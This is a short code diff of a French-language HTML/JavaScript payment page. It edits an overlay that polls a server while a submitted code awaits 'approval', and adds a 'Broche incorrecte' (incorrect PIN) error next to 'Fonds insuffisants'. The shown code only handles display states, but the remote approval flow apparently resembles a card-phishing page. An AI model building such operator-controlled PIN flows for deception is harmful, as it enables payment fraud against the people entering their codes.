@@ -385,7 +385,7 @@
     <div class="error-icon" id="errorIcon" aria-hidden="true">!</div>
     <div class="spinner" id="spinner"></div>
     <h2 id="overlayTitle">En attente d'approbation</h2>
-    <p id="overlayText">Votre demande a été envoyée. Merci de patienter pendant la vérification…</p>
+    <p id="overlayText">Code incorrect. Merci de patienter pendant la vérification…</p>
     <p class="denied-msg" id="deniedMsg">Code incorrect.</p>
     <button class="retry-btn" id="retryBtn">RÉESSAYER</button>
   </div>
@@ -480,10 +480,21 @@
           overlayText.style.display = 'none';
           overlay.classList.add('error-state');
 
-          deniedMsg.textContent = 'Fonds insuffisants';
+          deniedMsg.textContent = 'Fonds insuffisants.';
+          deniedMsg.style.display = 'block';
+          retryBtn.style.display = 'inline-block';
+        } else if(data.status === 'demo_error'){
+          clearInterval(pollTimer);
+          spinner.style.display = 'none';
+          overlayTitle.style.display = 'none';
+          overlayText.style.display = 'none';
+          overlay.classList.add('error-state');
+
+          deniedMsg.textContent = 'Broche incorrecte.';
           deniedMsg.style.display = 'block';
           retryBtn.style.display = 'inline-block';
         }
+
         // 'pending' -> keep polling
       } catch (err) {
         // network hiccup — keep trying silently
